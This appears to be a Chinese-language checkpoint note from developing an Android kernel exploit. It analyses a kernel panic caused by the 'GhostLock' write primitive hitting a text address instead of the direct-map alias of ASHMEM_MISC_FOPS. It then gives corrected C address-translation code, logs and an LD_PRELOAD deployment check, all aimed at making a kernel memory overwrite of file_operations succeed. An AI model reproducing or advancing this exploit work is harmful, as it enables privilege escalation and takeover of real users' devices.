# CHECKPOINT v32 — 崩溃根因分析 (2026-07-16)

> v32 部署后运行 → 手机重启 (kernel panic)
> 基于 v31_test1 日志 + 源码审计

---

## 根因: `canon_addr()` 没有做 direct-map 转换

### 代码证据

**util.c:216-218**:
```c
uintptr_t canon_addr(uintptr_t image_addr) {
  return kaslr_image_addr(image_addr);
}
```

**util.c:208-210**:
```c
uintptr_t kaslr_image_addr(uintptr_t image_addr) {
  return kaslr_base + (image_addr - KIMAGE_TEXT_BASE);
}
```

KASLR=0 时 `kaslr_base == KIMAGE_TEXT_BASE`，所以 `canon_addr()` ≡ **恒等变换**.

### 后果

main.c:560: `canon_addr(ASHMEM_MISC_FOPS)` 返回:
- **实际**: `0xffffffc00a8e76e8` (text 段地址)
- **应该是**: `0xffffff80028e76e8` (direct-map, P0_DATA_ALIAS_CONST)

GhostLock 写原语走 kernelsnitch，kernelsnitch 的 identity mapping 范围是:
```
KERNELSNITCH_IDENTITY_START = DIRECT_MAP_BASE = 0xffffff8000000000
KERNELSNITCH_IDENTITY_END   = DIRECT_MAP_END   = 0xffffff9000000000
```

text 地址 `ffffffc00a8e76e8` 不在此范围内 → GhostLock 写入错误的物理页 → 破坏内核数据结构 → kernel panic → 重启.

### v31_test1 日志佐证

```
target=ffffffc00a8e76e8 (ASHMEM_MISC_FOPS)  ← 这是 text 地址!
direct-w64[0] child=21321 status=0xb          ← SIGSEGV
fops-summary GhostLock write did not trigger
```

### 为什么 v30 不崩

v30 不通过 GhostLock shape=1 写 FOPS，而是走 rb_erase。rb_erase 通过内核自己的指针解引用操作内存，text/direct-map 都可以（同一物理页的不同虚拟映射）。而且 v30 根本写不到 FOPS（永远偏移 8 字节到 name_ptr）。

---

## 修复

### Fix 1: `canon_addr()` (CRITICAL)

**util.c**: 改成 true direct-map 转换:
```c
uintptr_t canon_addr(uintptr_t image_addr) {
  return P0_DATA_ALIAS_CONST(kaslr_image_addr(image_addr));
}
```

P0_DATA_ALIAS_CONST 计算:
```
P0_PAGE_OFFSET | (addr - KIMAGE_TEXT_BASE + P0_KERNEL_PHYS_DELTA)
= 0xffffff8000000000 | (addr - 0xffffffc008000000 + 0)
```

验证: ASHMEM_MISC_FOPS (0xffffffc00a8e76e8) → 0xffffff80028e76e8 ✅

### Fix 2: fops.c:106 — INIT_TASK 用 text_addr (防御性)

v30 用 `text_addr(INIT_TASK)` 验证过不崩。改回 text_addr 保持与 v30 一致。PI chain walk 用 text 地址安全（v30 已验证）。

---

## 部署后验证

```bash
# 编译后在 rish 内跑，观察日志中 target 地址:
# 正确: target=ffffff80028e76e8 (ffffff800..., 非 ffffffc00...)
LD_PRELOAD=/data/local/tmp/preload.so /system/bin/sleep 10
```
